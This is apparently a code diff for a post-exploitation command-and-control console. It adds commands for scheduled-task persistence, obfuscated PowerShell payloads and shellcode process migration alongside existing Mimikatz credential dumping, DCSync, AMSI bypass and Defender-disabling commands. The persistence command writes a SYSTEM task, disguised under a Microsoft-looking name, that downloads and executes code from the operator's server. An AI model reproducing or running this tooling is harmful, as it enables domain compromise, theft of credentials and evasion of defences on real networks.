@@ -3,6 +3,7 @@ import base64
 import hashlib,binascii
 from core import config
 from core.config import *
+from core.Obfuscate import *
 from core.Encryption import *
 from core import webserver
 from lib import prettytable
@@ -10,7 +11,7 @@ from core.color import bcolors
 from core.color import *
 import time
 import os
-
+import donut
 
 def Command_Completer(text, state):
     options = [i for i in cmd.COMMANDS if i.startswith(text)]
@@ -49,7 +50,10 @@ class cmd:
      'get_groups',
      'get_users',
      'bloodhound',
-     'dis_amsi']
+     'dis_amsi',
+     'unamanged_powershell',
+     'persist_schtasks',
+     'migrate']
 
     HELPCOMMANDS = [['exit', 'Exit the console , or kill the agent '],
      ['list', 'List all agents'],
@@ -79,7 +83,10 @@ class cmd:
      ['dcsync_list', 'do dcsync attack agains custom user list '],
      ['get_groups', 'get all the groups user is member of'],
      ['get_users', 'get all the users member in group'],
-     ['bloodhound', 'run bloodhound to collect all the information about the AD']]
+     ['bloodhound', 'run bloodhound to collect all the information about the AD'],
+     ['unamanged_powershell', 'run powershell payload through the dotnet agent'],
+     ['persist_schtasks', 'persistence using schedule tasks'],
+     ['migrate', 'migrate to new process ( default nslookup ) to hide the backdoor ']]
 
     def help(self, args = None):
         table = prettytable.PrettyTable([bcolors.BOLD + 'Command' + bcolors.ENDC, bcolors.BOLD + 'Description' + bcolors.ENDC])
@@ -89,7 +96,7 @@ class cmd:
         for i in self.HELPCOMMANDS:
             table.add_row([bcolors.OKBLUE + i[0] + bcolors.ENDC, i[1]])
 
-        print table
+        print (table)
 
     def exit(self, args = None):
         if config.get_pointer()=='main':
@@ -131,7 +138,7 @@ class cmd:
              config.AGENTS[i][6] + '\\' + config.AGENTS[i][7],
              config.AGENTS[i][8]])
 
-        print table
+        print (table)
 
     def use(self, args = None):
         if len(args) < 2:
@@ -159,7 +166,7 @@ class cmd:
         if config.get_pointer()!='main':
             config.set_pointer('main')
         if len(args) < 2:
-            print "delete <id>"
+            print ("delete <id>")
             return
         id = args[1]
         agent=''
@@ -175,15 +182,15 @@ class cmd:
 
     def payload(self, args = None):
         for i in config.PAYLOADS:
-            print i
-            print ''
+            print (i)
+            print ('')
 
     def show(self, args = None):
         pass
 
     def load(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         fpm = open('Modules/' + args[1], 'r')
         module = fpm.read()
@@ -192,22 +199,22 @@ class cmd:
 
     def downloads(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
-    	if os.path.isdir("downloads"):
-    		downloads = os.listdir("downloads")
-    		for file in downloads:
-    			print file
-    	else:
-    		print "[-] downloads directory not Available"
+        if os.path.isdir("downloads"):
+            downloads = os.listdir("downloads")
+            for file in downloads:
+                print (file)
+        else:
+            print ("[-] downloads directory not Available")
 
     def modules(self, args=None):
     	if os.path.isdir("Modules"):
     		modules = os.listdir("Modules")
     		for module in modules:
-    			print module
+    			print (module)
     	else:
-    		print "[-] modules directory not Available"
+    		print ("[-] modules directory not Available")
 
     def encode64(self, args=None):
         if len(args) > 1:
@@ -215,24 +222,24 @@ class cmd:
             #for i in args[1:]:
             #    b64=b64+i+" "
             b64=' '.join(args[1:])
-            print b64
-            print "encoded command :  "+base64.b64encode(b64.encode('UTF-16LE')).decode("utf-8")
+            print (b64)
+            print ("encoded command :  "+base64.b64encode(b64.encode('UTF-16LE')).decode("utf-8"))
         else:
-            print "[-] please add your command as argument : encode64 <command>"
+            print ("[-] please add your command as argument : encode64 <command>")
 
     def gen_ntlm(self, args=None):
         if len(args) > 1:
             password=args[1]
             hash = hashlib.new('md4', password.encode('utf-16le')).digest()
             hash=binascii.hexlify(hash)
-            print "NTLM Hash :  "+hash
+            print ("NTLM Hash :  "+hash.decode("UTF-8"))
         else:
-            print "[-] please add your password as argument : gen_ntlm <password>"
+            print ("[-] please add your password as argument : gen_ntlm <password>")
 
 
     def DA(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
@@ -240,7 +247,7 @@ class cmd:
 
     def kerb(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         #config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load ASBBypass.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Find-PSServiceAccounts.ps1"))
@@ -249,15 +256,15 @@ class cmd:
 
     def dcsync_admins(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
-        print "grab some coffe this may take too long to finish if the domain admin users are more than 10"
+        print ("grab some coffe this may take too long to finish if the domain admin users are more than 10")
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=(Get-ADGroupMember -Identity "Domain Admins").SamAccountName;For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}"""))
 
     def dcsync_all(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{domain} /all /csv"'""".replace("{domain}",config.AGENTS[config.get_pointer()][6])))
@@ -265,14 +272,14 @@ class cmd:
 
     def dcsync_list(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         user=[]
         try :
             if len(args) < 2:
-                print "Usage dcsunc_list <full file path>"
+                print ("Usage dcsunc_list <full file path>")
                 return
-            print "grab some coffe this may take too long to finish if the users are more than 10"
+            print ("grab some coffe this may take too long to finish if the users are more than 10")
             if len(' '.join(args[1:]).split(","))>1:
                 users=' '.join(args[1:]).replace(", ",",").replace(" ,",",")
             else:
@@ -284,67 +291,104 @@ class cmd:
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""$users=("{users}").split(",");For ($i=0; $i -le $users.Length; $i=$i+5) {echo $users[$i..($i+4)] | ForEach-Object  { $t='"lsadump::dcsync /user:rep"';$t=$t.replace("rep",$_);Invoke-Mimikatz -Command $t}}""".replace("{users}",users)))
         except Exception as e:
-            print e
+            print (e)
 
     def get_groups(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         try :
             if len(args) < 2:
-                print "Usage get_groups <user name>"
+                print ("Usage get_groups <user name>")
                 return
             user=' '.join(args[1:])
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
             user="""(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=User)(samAccountName=$("{user}")))")).FindOne().GetDirectoryEntry().memberOf""".replace("{user}",user)
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,user))
         except Exception as e:
-            print e
+            print (e)
 
     def get_users(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         try :
             if len(args) < 2:
-                print "Usage get_users <group name>"
+                print ("Usage get_users <group name>")
                 return
             group=' '.join(args[1:])
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load PowerView.ps1"))
             group="""Get-DomainGroupMember -Identity "{group}" -Recurse""".replace("{group}",group)
             config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,group))
         except Exception as e:
-            print e
+            print (e)
 
     def bloodhound(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load SharpHound.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Invoke-BloodHound -CollectionMethod All -NoSaveCache -RandomFilenames -ZipFileName "+"".join([random.choice(string.ascii_uppercase) for i in range(5)])))
 
     def drm(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"Set-MpPreference -DisableRealtimeMonitoring 1"))
 
     def dis_amsi(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load AMSI_Bypass.ps1"))
 
     def dumpcreds(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Invoke-Mimikatz.ps1"))
         config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'"""))
 
+    def persist_schtasks(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+        CC=''
+        while len(CC) == 0:
+            CC = input('please enter schedule type ( hourly , daily , weekly , onstart) or type exit to exit the persistence module')
+            if len(CC)>1:
+                try:
+                    if CC=='hourly':
+                        freq="Hourly"
+                        break;
+                    if CC== 'daily':
+                        freq='Daily'
+                        break
+                    if CC== 'onstart':
+                        freq='onstart'
+                        break
+                    if CC== 'weekly':
+                        freq='weekly'
+                        break
+                    if CC=='exit':
+                        return
+                except:
+                    print ("you entered wrong schedule type")
+                    CC=''
+                    continue
+            else:
+                CC=''
+                continue
+        if SSL==True:
+            http="https"
+        else:
+            http="http"
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"""schtasks /F /create /SC {freq} /RU "NT Authority\SYSTEM" /TN "\\Microsoft\\Windows\\UpdateOrchestrators\\AC Power install" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''{HTTP}://{ip}:{port}{payload}''')'\"""".replace('{ip}', HOST).replace('{port}', PORT).replace('{payload}', raw_payload).replace('{HTTP}', http).replace('{freq}', freq)))
+
+
     def screenshot(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         f=open("agents/screenshot.ninja","r")
         payload=f.read()
@@ -363,7 +407,7 @@ class cmd:
 
     def upload(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         f=open("agents/upload.ninja","r")
         payload=f.read()
@@ -381,7 +425,7 @@ class cmd:
 
     def download(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         global loaded
         f=open("agents/download.ninja","r")
@@ -401,8 +445,29 @@ class cmd:
 
     def set_beacon(self, args=None):
         if config.get_pointer()=='main':
-            print "you can't use this command in main ! chose an agent"
+            print ("you can't use this command in main ! chose an agent")
             return
         global loaded
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load download.ps1"))
-        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"$beacon="+args[1]))
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"$exchange="+args[1]))
+
+    def unamanged_powershell(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+        global loaded
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"loadpsh payload-obf.ps1"))
+
+
+    def migrate(self, args=None):
+        if config.get_pointer()=='main':
+            print ("you can't use this command in main ! chose an agent")
+            return
+        global loaded
+        shellcode=donut.create(file="payloads/dropper_cs.exe")
+        fp = open('agents/Migrator.ninja', 'r')
+        temp = fp.read()
+        temp=temp.replace('{shellcode}',base64.b64encode(shellcode).decode("utf-8")).replace('{class}',"".join([random.choice(string.ascii_uppercase) for i in range(5)]))
+        output=open('Modules/Migrator.ps1', 'w')
+        output.write(temp)
+        output.close()
+        config.COMMAND[config.get_pointer()].append(encrypt(config.AESKey,"load Migrator.ps1"))
